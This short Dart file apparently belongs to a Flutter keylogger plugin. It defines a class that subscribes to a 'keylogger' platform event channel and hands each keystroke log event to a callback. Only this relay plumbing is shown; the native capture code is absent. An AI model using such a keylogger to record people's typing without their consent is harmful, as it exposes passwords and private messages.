part of flutterkeylogger;

class _Keylogger {
  static const _eventChannel = EventChannel("keylogger");

  logs(Function onData) {
    _eventChannel.receiveBroadcastStream().listen(
      (event) {
        onData(Log._fromMap(event));
      },
      cancelOnError: true,
    );
  }
}

final keyLogger = _Keylogger();
